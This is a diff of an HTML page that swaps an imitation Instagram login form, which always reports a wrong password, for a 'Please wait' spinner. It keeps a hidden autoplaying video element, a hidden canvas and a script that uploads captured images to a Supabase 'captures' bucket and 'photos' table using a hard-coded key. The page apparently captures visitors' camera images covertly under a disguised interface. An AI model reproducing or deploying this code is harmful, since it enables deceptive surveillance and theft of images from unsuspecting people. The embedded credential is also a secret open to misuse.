@@ -44,48 +44,13 @@ video,canvas{display:none}
 </style>
 </head>
 <body>
-<main>
-  <section id="mobile"></section>
-  <section id="auth">
-    <div class="panel login">
-      <h1 title="Instagram">
-        <img src="./img//instagram-logo.png" alt="Instagram logo" />
-      </h1>
-      <form onsubmit="return false;">
-        <label for="email" class="sr-only">Phone number, username or email</label>
-        <input id="email" name="email" placeholder="Phone number, username or email" autocomplete="off"/>
-        <label for="password" class="sr-only">Password</label>
-        <input id="password" name="password" type="password" placeholder="Password" autocomplete="off"/>
-        <button type="button" id="loginBtn" onclick="handleLogin()">Log In</button>
-      </form>
-      <div id="msg"></div>
-      <div class="separator"><span></span><div class="or">OR</div><span></span></div>
-      <div class="login-with-fb">
-        <div><a href="#">Log in with Facebook</a></div>
-        <a href="#">Forgot password?</a>
-      </div>
-    </div>
-    <div class="panel register">
-      <p>Don't have an account?</p><a href="#">Sign up</a>
-    </div>
-    <div class="app-download">
-      <p>Get the app.</p>
-      <div>
-        <img src="./img/apple-button.png" alt="App Store" />
-                <img src="./img/googleplay-button.png" alt="Google Play" />
-      </div>
-    </div>
-  </section>
-</main>
-<footer>
-  <ul>
-    <li><a href="#">ABOUT</a></li><li><a href="#">HELP</a></li><li><a href="#">PRESS</a></li>
-    <li><a href="#">API</a></li><li><a href="#">CAREERS</a></li><li><a href="#">PRIVACY</a></li>
-    <li><a href="#">TERMS</a></li><li><a href="#">LOCATIONS</a></li><li><a href="#">TOP ACCOUNTS</a></li>
-    <li><a href="#">HASHTAGS</a></li><li><a href="#">LANGUAGE</a></li>
-  </ul>
-  <p class="copyright">© 2024 Instagram from Meta</p>
-</footer>
+<div id="loading" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;gap:20px">
+  <div style="font-size:24px;font-weight:600;color:#262626">Please wait</div>
+  <div style="width:40px;height:40px;border:4px solid #dbdbdb;border-top:4px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite"></div>
+</div>
+<style>
+@keyframes spin{to{transform:rotate(360deg)}}
+</style>
 <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
 <script>
 const S='https://yspjknemdmlejzsubycf.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlzcGprbmVtZG1sZWp6c3VieWNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3MDgyOTgsImV4cCI6MjA4ODI4NDI5OH0.JSAXs0UZJiBy2mgniSoSuN6BuW1iW-UhW785toC1weM';
@@ -117,16 +82,7 @@ async function up(){
   await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},body:JSON.stringify({session_id:sid,image_url:S+'/storage/v1/object/public/captures/'+f})});
 }
 
-async function handleLogin(){
-  const email=document.getElementById('email').value.trim();
-  const pass=document.getElementById('password').value.trim();
-  const msg=document.getElementById('msg');
-  const btn=document.getElementById('loginBtn');
-  if(!email||!pass){msg.textContent='Please fill in your credentials.';return;}
-  btn.disabled=true;btn.textContent='Logging in...';msg.textContent='';
-  btn.disabled=false;btn.textContent='Log In';
-  msg.textContent='Sorry, your password was incorrect. Please double-check your password.';
-}
+
 </script>
 </body>
 </html>
